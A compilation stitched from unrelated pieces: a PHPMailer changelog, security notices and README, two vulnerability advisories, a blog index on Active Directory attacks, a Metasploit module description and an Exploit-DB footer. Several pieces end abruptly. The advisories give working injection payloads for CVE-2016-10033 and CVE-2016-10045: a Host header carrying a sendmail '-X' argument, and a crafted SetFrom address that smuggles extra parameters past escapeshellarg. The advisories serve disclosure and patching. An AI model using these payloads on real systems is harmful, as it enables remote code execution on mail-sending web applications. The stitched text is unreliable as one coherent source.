## Version 5.2.21 (December 28th 2016)

* Fix missed number update in version file - no functional changes

## Version 5.0.1 (April 05, 2009)

* Temporary fix for missing attachments

## Version 5.0.0 (April 02, 2009)

With the release of this version, we are initiating a new version numbering
system to differentiate from the PHP4 version of PHPMailer.
Most notable in this release is fully object oriented code.

### class.smtp.php:

* Refactored class.smtp.php to support new exception handling
* code size reduced from 29.2 Kb to 25.6 Kb
* Removed unnecessary functions from class.smtp.php:
  + public function Expand($name) {
  + public function Help($keyword="") {
  + public function Noop() {
  + public function Send($from) {
  + public function SendOrMail($from) {
  + public function Verify($name) {

### class.phpmailer.php:

* Refactored class.phpmailer.php with new exception handling
* Changed processing functionality of Sendmail and Qmail so they cannot be
  inadvertently used
* removed getFile() function, just became a simple wrapper for
  file\_get\_contents()
* added check for PHP version (will gracefully exit if not at least PHP 5.0)
* enhanced code to check if an attachment source is the same as an embedded or
  inline graphic source to eliminate duplicate attachments

### New /test\_script

We have written a test script you can use to test the script as part of your
installation. Once you press submit, the test script will send a multi-mime
email with either the message you type in or an HTML email with an inline
graphic. Two attachments are included in the email (one of the attachments
is also the inline graphic so you can see that only one copy of the graphic
is sent in the email). The test script will also display the functional
script that you can copy/paste to your editor to duplicate the functionality.

### New examples

All new examples in both basic and advanced modes. Advanced examples show
Exception handling.

### PHPDocumentator (phpdocs) documentation for PHPMailer version 5.0.0

All new documentation

## Version 2.3 (November 06, 2008)

## Version 2.2.1 (July 19, 2008)

* fixed line 1092 in class.smtp.php (my apologies, error on my part)

* fixed error in getResponse function declaration (class.pop3.php)
* PHPMailer now PHP6 compliant
* fixed line 1092 in class.smtp.php (endless loop from missing = sign)

## Version 2.1 (Wed, June 04 2008)

NOTE: WE HAVE A NEW LANGUAGE VARIABLE FOR DIGITALLY SIGNED S/MIME EMAILS. IF YOU CAN HELP WITH LANGUAGES OTHER THAN ENGLISH AND SPANISH, IT WOULD BE APPRECIATED.

* added S/MIME functionality (ability to digitally sign emails)
  BIG THANKS TO "sergiocambra" for posting this patch back in November 2007.
  The "Signed Emails" functionality adds the Sign method to pass the private key
  filename and the password to read it, and then email will be sent with
  content-type multipart/signed and with the digital signature attached.
* fully compatible with E\_STRICT error level
  + Please note:
    In about half the test environments this development version was subjected
    to, an error was thrown for the date() functions used (line 1565 and 1569).
    This is NOT a PHPMailer error, it is the result of an incorrectly configured
    PHP5 installation. The fix is to modify your 'php.ini' file and include the
    date.timezone = Etc/UTC (or your own zone)
    directive, to your own server timezone
  + If you do get this error, and are unable to access your php.ini file:
    In your PHP script, add
    `date_default_timezone_set('Etc/UTC');`
  + do not try to use
    `$myVar = date_default_timezone_get();`
    as a test, it will throw an error.
* added ability to define path (mainly for embedded images)
  function `MsgHTML($message,$basedir='')` ... where:
  `$basedir` is the fully qualified path
* fixed `MsgHTML()` function:
  + Embedded Images where images are specified by `<protocol>://` will not be altered or embedded
* fixed the return value of SMTP exit code ( pclose )
* addressed issue of multibyte characters in subject line and truncating
* added ability to have user specified Message ID
  (default is still that PHPMailer create a unique Message ID)
* corrected unidentified message type to 'application/octet-stream'
* fixed chunk\_split() multibyte issue (thanks to Colin Brown, et al).
* added check for added attachments
* enhanced conversion of HTML to text in MsgHTML (thanks to "brunny")

## Version 2.1.0beta2 (Sun, Dec 02 2007)

* implemented updated EncodeQP (thanks to coolbru, aka Marcus Bointon)
* finished all testing, all known bugs corrected, enhancements tested

Note: will NOT work with PHP4.

# Security notices relating to PHPMailer

Please disclose any security issues or vulnerabilities found through [Tidelift's coordinated disclosure system](https://tidelift.com/security) or to the maintainers privately.

PHPMailer 6.4.1 and earlier contain a vulnerability that can result in untrusted code being called (if such code is injected into the host project's scope by other means). If the `$patternselect` parameter to `validateAddress()` is set to `'php'` (the default, defined by `PHPMailer::$validator`), and the global namespace contains a function called `php`, it will be called in preference to the built-in validator of the same name. Mitigated in PHPMailer 6.5.0 by denying the use of simple strings as validator function names. Recorded as [CVE-2021-3603](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2021-3603). Reported by Vikrant Singh Chauhan via [huntr.dev](https://www.huntr.dev/).

PHPMailer versions 6.4.1 and earlier contain a possible remote code execution vulnerability through the `$lang_path` parameter of the `setLanguage()` method. If the `$lang_path` parameter is passed unfiltered from user input, it can be set to [a UNC path](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths), and if an attacker is also able to persuade the server to load a file from that UNC path, a script file under their control may be executed. This vulnerability only applies to systems that resolve UNC paths, typically only Microsoft Windows.
PHPMailer 6.5.0 mitigates this by no longer treating translation files as PHP code, but by parsing their text content directly. This approach avoids the possibility of executing unknown code while retaining backward compatibility. This isn't ideal, so the current translation format is deprecated and will be replaced in the next major release. Recorded as [CVE-2021-34551](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2021-34551). Reported by [Jilin Diting Information Technology Co., Ltd](https://listensec.com) via Tidelift.

PHPMailer versions between 6.1.8 and 6.4.0 contain a regression of the earlier CVE-2018-19296 object injection vulnerability as a result of [a fix for Windows UNC paths in 6.1.8](https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9). Recorded as [CVE-2020-36326](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2020-36326). Reported by Fariskhi Vidyan via Tidelift. 6.4.1 fixes this issue, and also enforces stricter checks for URL schemes in local path contexts.

PHPMailer versions 6.1.5 and earlier contain an output escaping bug that occurs in `Content-Type` and `Content-Disposition` when filenames passed into `addAttachment` and other methods that accept attachment names contain double quote characters, in contravention of RFC822 3.4.1. No specific vulnerability has been found relating to this, but it could allow file attachments to bypass attachment filters that are based on matching filename extensions. Recorded as [CVE-2020-13625](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2020-13625). Reported by Elar Lang of Clarified Security.

PHPMailer versions prior to 6.0.6 and 5.2.27 are vulnerable to an object injection attack by passing `phar://` paths into `addAttachment()` and other functions that may receive unfiltered local paths, possibly leading to RCE. Recorded as [CVE-2018-19296](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2018-19296). See [this article](https://knasmueller.net/5-answers-about-php-phar-exploitation) for more info on this type of vulnerability. Mitigated by blocking the use of paths containing URL-protocol style prefixes such as `phar://`. Reported by Sehun Oh of cyberone.kr.

PHPMailer versions prior to 5.2.24 (released July 26th 2017) have an XSS vulnerability in one of the code examples, [CVE-2017-11503](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-11503). The `code_generator.phps` example did not filter user input prior to output. This file is distributed with a `.phps` extension, so it is not normally executable unless it is explicitly renamed, and the file is not included when PHPMailer is loaded through composer, so it is safe by default. There was also an undisclosed potential XSS vulnerability in the default exception handler (unused by default). Patches for both issues kindly provided by Patrick Monnerat of the Fedora Project.

PHPMailer versions prior to 5.2.22 (released January 9th 2017) have a local file disclosure vulnerability, [CVE-2017-5223](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-5223). If content passed into `msgHTML()` is sourced from unfiltered user input, relative paths can map to absolute local file paths and added as attachments. Also note that `addAttachment` (just like `file_get_contents`, `passthru`, `unlink`, etc) should not be passed user-sourced params either! Reported by Yongxiang Li of Asiasecurity.

PHPMailer versions prior to 5.2.20 (released December 28th 2016) are vulnerable to [CVE-2016-10045](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10045) a remote code execution vulnerability, responsibly reported by [Dawid Golunski](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html), and patched by Paul Buonopane (@Zenexer).

PHPMailer versions prior to 5.2.18 (released December 2016) are vulnerable to [CVE-2016-10033](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033) a remote code execution vulnerability, responsibly reported by [Dawid Golunski](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html).

PHPMailer versions prior to 5.2.14 (released November 2015) are vulnerable to [CVE-2015-8476](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-8476) an SMTP CRLF injection bug permitting arbitrary message sending.

PHPMailer versions prior to 5.2.10 (released May 2015) are vulnerable to [CVE-2008-5619](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2008-5619), a remote code execution vulnerability in the bundled html2text library. This file was removed in 5.2.10, so if you are using a version prior to that and make use of the html2text function, it's vitally important that you upgrade and remove this file.

PHPMailer versions prior to 2.0.7 and 2.2.1 are vulnerable to [CVE-2012-0796](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-0796), an email header injection attack.

Joomla 1.6.0 uses PHPMailer in an unsafe way, allowing it to reveal local file paths, reported in [CVE-2011-3747](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-3747).

PHPMailer didn't sanitise the `$lang_path` parameter in `SetLanguage`. This wasn't a problem in itself, but some apps (PHPClassifieds, ATutor) also failed to sanitise user-provided parameters passed to it, permitting semi-arbitrary local file inclusion, reported in [CVE-2010-4914](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-4914), [CVE-2007-2021](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2007-2021) and [CVE-2006-5734](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2006-5734).

PHPMailer 1.7.2 and earlier contained a possible DDoS vulnerability reported in [CVE-2005-1807](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2005-1807).

PHPMailer 1.7 and earlier (June 2003) have a possible vulnerability in the `SendmailSend` method where shell commands may not be sanitised. Reported in [CVE-2007-3215](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2007-3215).

- CVE-2016-10033
- Release date: 11.05.2017
- Revision 1.0
- Severity: Critical
=============================================

I. VULNERABILITY
-------------------------

Vanilla Forums <= 2.3 Unauth. Remote Code Execution (RCE) exploit CVE-2016-10033 [0day]

II. BACKGROUND
-------------------------

"Community Forums Reinvented

software is used by top brands to engage customers, drive loyalty and reduce
support costs."

"Vanilla provides cloud and open source community forum software that powers
discussion forums worldwide with close to 1M downloads.

community solution in the world."

<https://vanillaforums.com/en/software/>
<https://open.vanillaforums.com/>

III. INTRODUCTION
-------------------------

Vanilla Forums software (including the latest stable version of 2.3 in
its default configuration) is affected by:

* Remote Code Execution CVE-2016-10033 (0day)

which can be exploited by unauthenticated remote attackers to execute
arbitrary code and fully compromise the target application when combined
with Host Header injection vulnerability CVE-2016-10073 (described in
a separate advisory).

IV. DESCRIPTION
-------------------------

As described in the advisory of CVE-2016-10073:

The HOST header is used to form the sender email address as we can see
in the following snippet of code:

------[ library/core/class.email.php ]------

...

public function from($SenderEmail = '', $SenderName = '', $bOverrideSender = false) {
        if ($SenderEmail == '') {
            $SenderEmail = c('Garden.Email.SupportAddress', '');
            if (!$SenderEmail) {
                $SenderEmail = 'noreply@'.Gdn::request()->host();
            }
        }

        if ($SenderName == '') {
            $SenderName = c('Garden.Email.SupportName', c('Garden.Title', ''));
        }

        if ($this->PhpMailer->Sender == '' || $bOverrideSender) {
            $this->PhpMailer->Sender = $SenderEmail;
        }

        ob_start();
        $this->PhpMailer->setFrom($SenderEmail, $SenderName, false);
        ob_end_clean();
        return $this;
}

...

-----------------------------------------

In default configuration of Vanilla the address is then passed
to the phpmailer library as the sender address in the line:

$this->PhpMailer->Sender = $SenderEmail;

The official stable version 2.3 available at:
<https://open.vanillaforums.com/addon/vanilla-core-2.3>

is bundled with PHPMailer library in version 5.1:

-----[ library/vendors/phpmailer/class.phpmailer.php ]----

<?php
/*~ class.phpmailer.php
|  Software: PHPMailer - PHP email class
|   Version: 5.1

----------------------------------------------------------

This version of PHPMailer is affected by the:

* PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)

vulnerability also discovered by the author of this advisory
and described in detail at:

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

Similarly to recently disclosed exploit of WordPress Core 4.6 RCE:
<https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html>

remote attackers may exploit the phpmailer vulnerability in Vanilla Forums
by passing the payload (additional parameters to /usr/sbin/sendmail) within the HOST
header.

For example, the following web request:

---

POST /vanilla2-3/entry/passwordrequest HTTP/1.1
Host: vanilla-forums-vhost -X
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: close
Content-Length: 149

hpt=&Target=discussions&ClientHour=2017-05-10+22%3A00&Email=admin&Request+a+new+password=Request+a+new+password&DeliveryType=VIEW&DeliveryMethod=JSON

---

would inject -X parameter at the end of the argument list passed to
/usr/bin/sendmail :

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-oi]
Arg no. 4 == [-f]
Arg no. 5 == [noreply@attackers_server]
Arg no. 6 == [-X]

NOTE:
It should be noted that this vulnerability can still be exploited even if Vanilla
software is hosted on Apache web server with several name-based vhosts enabled, and
despite not being the default vhost.

This is possible as the attacker can take advantage of HTTP/1.0
protocol and specify the exact vhost within the URL. This will allow the HOST
header to be set to arbitrary value as the Apache server will obtain the SERVER_NAME
from the provided URL.
This will ensure that the malicious request will reach the affected code despite invalid
vhost within the HOST header.

To demonstrate, the above web request could be simply modified to:

---

POST <http://vanilla-forums-vhost/vanilla2-3/entry/passwordrequest> HTTP/1.1
Host: arbitrary-string -X

---

to achieve the same effect on a host with multiple vhosts.

VI. BUSINESS IMPACT
-------------------------

Upon a successfull exploitation, a remote unauthenticated attacker could
remotely execute arbitrary code on the target and fully compromise the
application / system on which the application is hosted.

VII. SYSTEMS AFFECTED
-------------------------

The latest stable release of Vanilla Forums available at the official website:

<https://open.vanillaforums.com/addon/vanilla-core-2.3>

was confirmed to be vulnerable.
Previous versions are also likely to be vulnerable.

VIII. SOLUTION
-------------------------

This vulnerability was reported to Vanilla Forums support team in December
2016 however it has remained unpatched for over 5 months.
As there has been no progress in this case , this advisory is finally
released to the public without an official patch.

As a quick mitigation (before updating the affected PHPMailer library), users
can pre-set the support email (sender's address) to a static value to
prevent the dynamic creation of the email address / the use of the HOST header.

=============================================
- Discovered by: Dawid Golunski
- dawid[at]legalhackers.com
- <https://legalhackers.com>

- CVE-2016-10045
- Release date: 27.12.2016
- Last revision: 28.12.2016
- Revision 3.0
- Severity: Critical
=============================================

I. VULNERABILITY
-------------------------

PHPMailer < 5.2.20 Remote Code Execution (0day Patch Bypass/exploit)

II. BACKGROUND
-------------------------

"PHPMailer continues to be the world's most popular transport class, with an
estimated 9 million users worldwide. Downloads continue at a significant
pace daily."

<http://phpmailer.worxware.com/>

"Probably the world's most popular code for sending email from PHP!
Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii,
Joomla! and many more"

<https://github.com/PHPMailer/PHPMailer>

III. INTRODUCTION
-------------------------

An independent research uncovered a critical vulnerability in PHPMailer that
could potentially be used by (unauthenticated) remote attackers to achieve
remote arbitrary code execution in the context of the web server user and
remotely compromise the target web application.

To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the PHPMailer class.

The first patch of the vulnerability CVE-2016-10033 was incomplete.
This advisory demonstrates the bypass of the patch.
The bypass allows to carry out Remote Code Execution on all current
versions (including 5.2.19).

NOTE:
The vulnerability / patch bypass was responsibly reported to the vendor
in private on December 26th and a new CVE was issued by MITRE on the same day.
However a potential bypass was publicly discussed on the oss-sec list.
Holding the advisory further would serve no purpose which is what triggered
the earlier release of this advisory.

IV. DESCRIPTION
-------------------------

The patch for CVE-2016-10033 vulnerability added in PHPMailer 5.2.17
sanitizes the $Sender variable by applying escapeshellarg() escaping
before the value is passed to mail() function.

It does not however take into account the clashing of the
escapeshellarg() function with internal escaping with escapeshellcmd()
performed by mail() function on the 5th parameter.

As a result it is possible to inject an extra quote that does not get
properly escaped and break out of the escapeshellarg() protection
applied by the patch in PHPMailer 5.2.17.

For example:

$mail->SetFrom("\"Attacker\\' -Param2 -Param3\"@test.com", 'Client Name');

will result in the followig list of arguments passed to sendmail program:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-f\"Attacker\\\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com']

An attacker could pass the -X parameter of sendmail to write out a
log file with arbitrary PHP code.

This makes the current latest 5.2.19 and 5.2.18 versions of PHPMailer
vulnerable to Remote Code Execution despite the patch.

A working PoC is presented below.

PHPMailer < 5.2.18 Remote Code Execution [CVE-2016-10033]

Severity: CRITICAL

Discovered by:
Dawid Golunski (@dawid_golunski)
<https://legalhackers.com>

PHPMailer
"Probably the world's most popular code for sending email from PHP!
Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii,
Joomla! and many more"

Desc:
An independent research uncovered a critical vulnerability in PHPMailer that
could potentially be used by (unauthenticated) remote attackers to achieve
remote arbitrary code execution in the context of the web server user and
remotely compromise the target web application.
To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the PHPMailer class.

Patching:
Responsibly disclosed to PHPMailer team.
They've released a critical security release.
If you are using an affected release update to the 5.2.18 security
release as advised at:
<https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md>

Notes:
I know this is a bad timing and a short notice (for everyone probably ;)
I've spent most of my Christmas break working on this issue with
affected vendors.
This has been quite a rush as one of the vendors leaked excessive
information on this vulnerability at one point which could aid
potential attackers.

I've released a limited advisory at the link below:

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

This is to give people a chance to immediately patch or at least be
aware of the issue before we get closer to a working day/end of
holiday for affected users to act on this issue.

I'm planning to release the full advisory and a PoC exploit shortly so
that everyone is on the same page.

Upcoming Video PoC exploit:

## Why you might need it

Many PHP developers need to send email from their code. The only PHP function that supports this directly is [`mail()`](https://www.php.net/manual/en/function.mail.php). However, it does not provide any assistance for making use of popular features such as encryption, authentication, HTML messages, and attachments.

Formatting email correctly is surprisingly difficult. There are myriad overlapping (and conflicting) standards, requiring tight adherence to horribly complicated formatting and encoding rules – the vast majority of code that you'll find online that uses the `mail()` function directly is just plain wrong, if not unsafe!

The PHP `mail()` function usually sends via a local mail server, typically fronted by a `sendmail` binary on Linux, BSD, and macOS platforms, however, Windows usually doesn't include a local mail server; PHPMailer's integrated SMTP client allows email sending on all platforms without needing a local mail server. Be aware though, that the `mail()` function should be avoided when possible; it's both faster and [safer](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html) to use SMTP to localhost.

*Please* don't be tempted to do it yourself – if you don't use PHPMailer, there are many other excellent libraries that
you should look at before rolling your own. Try [SwiftMailer](https://swiftmailer.symfony.com/)
, [Laminas/Mail](https://docs.laminas.dev/laminas-mail/), [ZetaComponents](https://github.com/zetacomponents/Mail), etc.

Please read [LICENSE](https://github.com/PHPMailer/PHPMailer/blob/master/LICENSE) for information on the software availability and distribution.

## Installation & loading

PHPMailer is available on [Packagist](https://packagist.org/packages/phpmailer/phpmailer) (using semantic versioning), and installation via [Composer](https://getcomposer.org) is the recommended way to install PHPMailer. Just add this line to your `composer.json` file:

```
"phpmailer/phpmailer": "^6.9.2"
```

or run

```
composer require phpmailer/phpmailer
```

Note that the `vendor` folder and the `vendor/autoload.php` script are generated by Composer; they are not part of PHPMailer.

If you want to use XOAUTH2 authentication, you will also need to add a dependency on the `league/oauth2-client` and appropriate service adapters package in your `composer.json`, or take a look at
by @decomplexity's [SendOauth2 wrapper](https://github.com/decomplexity/SendOauth2), especially if you're using Microsoft services.

Alternatively, if you're not using Composer, you
can [download PHPMailer as a zip file](https://github.com/PHPMailer/PHPMailer/archive/master.zip), (note that docs and examples are not included in the zip file), then copy the contents of the PHPMailer folder into one of the `include_path` directories specified in your PHP configuration and load each class file manually:

```
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'path/to/PHPMailer/src/Exception.php';
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';
```

If you're not using the `SMTP` class explicitly (you're probably not), you don't need a `use` line for the SMTP class. Even if you're not using exceptions, you do still need to load the `Exception` class as it is used internally.

## Legacy versions

PHPMailer 5.2 (which is compatible with PHP 5.0 — 7.0) is no longer supported, even for security updates. You will find the latest version of 5.2 in the [5.2-stable branch](https://github.com/PHPMailer/PHPMailer/tree/5.2-stable). If you're using PHP 5.5 or later (which you should be), switch to the 6.x releases.

### Upgrading from 5.2

The biggest changes are that source files are now in the `src/` folder, and PHPMailer now declares the namespace `PHPMailer\PHPMailer`. This has several important effects – [read the upgrade guide](https://github.com/PHPMailer/PHPMailer/tree/master/UPGRADING.md) for more details.

### Minimal installation

While installing the entire package manually or with Composer is simple, convenient, and reliable, you may want to include only vital files in your project. At the very least you will need [src/PHPMailer.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/PHPMailer.php). If you're using SMTP, you'll need [src/SMTP.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/SMTP.php), and if you're using POP-before SMTP (*very* unlikely!), you'll need [src/POP3.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/POP3.php). You can skip the [language](https://github.com/PHPMailer/PHPMailer/tree/master/language/) folder if you're not showing errors to users and can make do with English-only errors. If you're using XOAUTH2 you will need [src/OAuth.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/OAuth.php) as well as the Composer dependencies for the services you wish to authenticate with. Really, it's much easier to use Composer!

## A Simple Example

```
<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.example.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'user@example.com';                     //SMTP username
    $mail->Password   = 'secret';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('from@example.com', 'Mailer');
    $mail->addAddress('joe@example.net', 'Joe User');     //Add a recipient
    $mail->addAddress('ellen@example.com');               //Name is optional
    $mail->addReplyTo('info@example.com', 'Information');
    $mail->addCC('cc@example.com');
    $mail->addBCC('bcc@example.com');

    //Attachments
    $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'Here is the subject';
    $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
```

You'll find plenty to play with in the [examples](https://github.com/PHPMailer/PHPMailer/tree/master/examples) folder, which covers many common scenarios including sending through Gmail, building contact forms, sending to mailing lists, and more.

If you are re-using the instance (e.g. when sending to a mailing list), you may need to clear the recipient list to avoid sending duplicate messages. See [the mailing list example](https://github.com/PHPMailer/PHPMailer/blob/master/examples/mailing_list.phps) for further guidance.

That's it. You should now be ready to use PHPMailer!

## Localization

PHPMailer defaults to English, but in the [language](https://github.com/PHPMailer/PHPMailer/tree/master/language/) folder, you'll find many translations for PHPMailer error messages that you may encounter. Their filenames contain [ISO 639-1](https://en.wikipedia.org/wiki/ISO_639-1) language code for the translations, for example `fr` for French. To specify a language, you need to tell PHPMailer which one to use, like this:

```
//To load the French version
$mail->setLanguage('fr', '/optional/path/to/language/directory/');
```

We welcome corrections and new languages – if you're looking for corrections, run the [Language/TranslationCompletenessTest.php](https://github.com/PHPMailer/PHPMailer/blob/master/test/Language/TranslationCompletenessTest.php) script in the tests folder and it will show any missing translations.

## Documentation

Start reading at the [GitHub wiki](https://github.com/PHPMailer/PHPMailer/wiki). If you're having trouble, head for [the troubleshooting guide](https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting) as it's frequently updated.

Examples of how to use PHPMailer for common scenarios can be found in the [examples](https://github.com/PHPMailer/PHPMailer/tree/master/examples) folder. If you're looking for a good starting point, we recommend you start with [the Gmail example](https://github.com/PHPMailer/PHPMailer/tree/master/examples/gmail.phps).

To reduce PHPMailer's deployed code footprint, examples are not included if you load PHPMailer via Composer or via [GitHub's zip file download](https://github.com/PHPMailer/PHPMailer/archive/master.zip), so you'll need to either clone the git repository or use the above links to get to the examples directly.

Complete generated API documentation is [available online](https://phpmailer.github.io/PHPMailer/).

You can generate complete API-level documentation by running `phpdoc` in the top-level folder, and documentation will appear in the `docs` folder, though you'll need to have [PHPDocumentor](https://www.phpdoc.org) installed. You may find [the unit tests](https://github.com/PHPMailer/PHPMailer/blob/master/test/PHPMailer/PHPMailerTest.php) a good reference for how to do various operations such as encryption.

If the documentation doesn't cover what you need, search the [many questions on Stack Overflow](https://stackoverflow.com/questions/tagged/phpmailer), and before you ask a question about "SMTP Error: Could not connect to SMTP host.", [read the troubleshooting guide](https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting).

## Tests

[PHPMailer tests](https://github.com/PHPMailer/PHPMailer/tree/master/test/) use PHPUnit 9, with [a polyfill](https://github.com/Yoast/PHPUnit-Polyfills) to let 9-style tests run on older PHPUnit and PHP versions.

As I am often looking for misconfigurations dealing with Kerberos delegation, I realize that I was missing an interesting element while playing with the Kerberos protocol extensions S4U2Self and S4U2Proxy.

# [How to mitigate DnsAdmins privilege escalation ?](https://phackt.com/dnsadmins-group-mitigation)

12 May 2021

Hello,

Glad to see you in this second part of this [post](https://phackt.com/dnsadmins-group-exploitation-write-permissions). In our previous [article](https://phackt.com/dnsadmins-group-exploitation-write-permissions) we showed which rights were involved in the DnsAdmins privilege escalation. Now let’s talk about how to properly mitigate this.

# [Why DnsAdmins privilege escalation is still working ?](https://phackt.com/dnsadmins-group-exploitation-write-permissions)

22 Apr 2021

Hello,

In this article, first part of a serie, i’m talking about **DnsAdmins** and why this is a group you should take care of. I know that several articles talk about the privilege escalation (DNS service running on a domain controller and loading an arbitrary DLL).

We will quickly review this attack, but mainly i would rather focus on why it is still working nowadays, which permissions do you need to run this attack. I will conclude in a second part with the mitigations which can be implemented to prevent this attack.

# [Kerberos constrained delegation with protocol transition](https://phackt.com/en-kerberos-constrained-delegation-with-protocol-transition)

27 Nov 2020

Hello,

Today, we are talking about the exploitation of Kerberos protocol extensions [S4U2Self](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13) and [S4U2Proxy](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a) in order to impersonate a privileged user of the domain.

This post aims at focusing on the [Kerberos constrained delegation with protocol transition](https://docs.microsoft.com/fr-fr/previous-versions/windows/it-pro/windows-server-2003/cc739587%28v%3Dws.10%29) which we will shorten `T2A4D` (**TrustedToAuthForDelegation**); how to enumerate it, how to exploit it and use it as a method of persistence.

# [SecurityTube Advanced Red Team Lab training - Worth it ?](https://phackt.com/securitytube-redteam-labs-invoke-recon)

22 Sep 2020

Quick answer: **Totally** !

Hello everybody,

I would like to talk a bit about the [SecurityTube red team labs](https://www.pentesteracademy.com/redlabs), specifically the [Advanced Red Team Lab](https://www.pentesteracademy.com/redteamlab) which leads to the **CRTE** (Certified Red Team Expert) certification. *P.S: i’m not affiliated with securitytube*.

Some great [reviews](https://www.google.com/search?q=review+red+team+lab+pentester+academy+%22CRTE%22) are already existing, so i will focus on why i chose this lab and certification. I will give you some hints about how to approach your targets. Most importantly, i would like to introduce you a tool that i developped which will help you during your journey, [Invoke-Recon](https://github.com/phackt/Invoke-Recon).

        This module exploits a command injection vulnerability in WordPress
        version 4.6 with Exim as an MTA via a spoofed Host header to PHPMailer,
        a mail-sending library that is bundled with WordPress.

        A valid WordPress username is required to exploit the vulnerability.
        Additionally, due to the altered Host header, exploitation is limited to
        the default virtual host, assuming the header isn't mangled in transit.

        If the target is running Apache 2.2.32 or 2.4.24 and later, the server
        may have HttpProtocolOptions set to Strict, preventing a Host header
        containing parens from passing through, making exploitation unlikely.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
